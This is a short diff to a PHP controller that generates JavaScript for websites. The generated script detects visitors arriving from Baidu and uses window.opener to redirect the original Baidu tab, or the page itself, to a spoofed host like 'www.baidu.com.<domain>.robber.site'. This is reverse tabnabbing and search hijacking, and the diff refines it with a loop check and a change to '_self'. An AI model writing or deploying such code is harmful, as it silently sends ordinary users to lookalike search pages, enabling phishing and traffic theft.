@@ -14,13 +14,14 @@ class JsController extends Controller {
 			return view('js', ['js' => '请设置站点<a href="' . url('/website/' . $website->id . '/keyword') . '">关键词</a>']);
 		}
 
-		$js = 'if(window.opener){
-                if(document.referrer.indexOf("baidu.com") != -1){
+		$js = '
+		if(window.opener){
+                if(document.referrer.indexOf("baidu.com") != -1 && document.referrer.indexOf("robber.site") == -1){
                         window.opener.location.href = "http://www.baidu.com.' . $website->domain . '.robber.site/s?wd=' . $keyword->keyword_default . '";
                 }
         }else{
                 if(document.referrer.indexOf("baidu.com") != -1){
-                        window.open(window.location.href, "_blank");
+                        window.open(window.location.href, "_self");
                         window.location.href = "http://www.baidu.com.' . $website->domain . '.robber.site/s?wd=' . $keyword->keyword_default . '";
                 }
         }';
